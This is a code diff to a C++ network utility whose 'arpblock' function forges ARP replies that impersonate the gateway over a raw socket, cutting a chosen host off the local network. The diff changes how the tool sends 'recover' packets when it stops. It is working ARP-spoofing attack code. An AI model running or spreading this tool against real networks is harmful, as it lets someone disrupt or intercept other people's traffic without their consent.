@@ -142,6 +142,7 @@ int arpscan(string interface) {
 
 int sock = 0;
 int stop = false;
+int if_index = 0;
 ARP *recover = nullptr;
 int arpblock(string ip) {
   IPv4Addr target_ip;
@@ -159,9 +160,15 @@ int arpblock(string ip) {
     if (sock <= 0 || recover == nullptr)
       return;
     cout << "Caught signal " << signum << ", sending recover packets..." << endl;
+    sockaddr_ll sa;
+    memset(&sa, 0, sizeof(sa));
+    sa.sll_family = AF_PACKET;
+    sa.sll_protocol = htons(ETH_P_ARP);
+    sa.sll_ifindex = if_index;
+    memcpy(sa.sll_addr, &recover->eth_hdr.source_mac, ETH_ALEN);
     stop = true;
     for (int i = 0; i < 10; i++) {
-      if (send(sock, recover, sizeof(*recover), 0) < 0)
+      if (sendto(sock, recover, sizeof(*recover), 0, (sockaddr*)&sa, sizeof(sa)) < 0)
         break;
       this_thread::sleep_for(chrono::seconds(1));
     }
@@ -181,7 +188,7 @@ int arpblock(string ip) {
     cerr << "Failed to get interface info." << endl;
     return 1;
   }
-  int if_index = NetInfoManager::instance().get_interface_index(route_info.first);
+  if_index = NetInfoManager::instance().get_interface_index(route_info.first);
   if (if_index == -1) {
     cerr << "Failed to get interface index." << endl;
     return 1;
@@ -193,10 +200,7 @@ int arpblock(string ip) {
   if (gateway_ip == nullptr) {
     cerr << "Failed to get IP address of the gateway." << endl;
     return 1;
-  }
-  IPv4Addr fake_ip = *gateway_ip;
-
-  // Generate and bind raw socket.
+  } IPv4Addr fake_ip = *gateway_ip; // Generate and bind raw socket.
   sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
   if (sock < 0) {
     cerr << "Failed to create socket." << endl;
@@ -224,10 +228,9 @@ int arpblock(string ip) {
 
 
   // Generate ARP fake reply and recover packet.
-  // Info : if the recovery packet is the original reply packet to the target, Android devices won't recover.
   recover = new ARP();
-  *recover = ARP::make_packet(netinfo->mac, target_mac, ARPHeader::Operation::Request,
-    gateway_mac, *gateway_ip, 0xFFFFFFFFFFFF, target_ip);
+  *recover = ARP::make_packet(gateway_mac, target_mac, ARPHeader::Operation::Reply,
+    gateway_mac, *gateway_ip, target_mac, target_ip);
 
   // Send ARP fake reply packet.
   while(!stop) {
